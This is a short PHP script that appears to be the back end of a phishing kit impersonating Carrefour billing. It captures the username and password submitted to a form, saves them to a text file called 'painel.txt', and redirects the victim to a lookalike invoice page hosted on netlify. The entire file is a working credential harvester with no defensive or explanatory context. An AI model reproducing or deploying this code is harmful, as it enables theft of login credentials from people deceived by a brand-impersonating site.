<?php
$email = $_POST['username'];
$senha = $_POST['password'];
$tudo = "".$email.";".$senha."<br>";
$fopen = fopen("painel.txt", "a");
fwrite($fopen, $tudo);
fclose($fopen);


header("Location: https://faturacarrefour.netlify.app/consultando fatura.html");
?>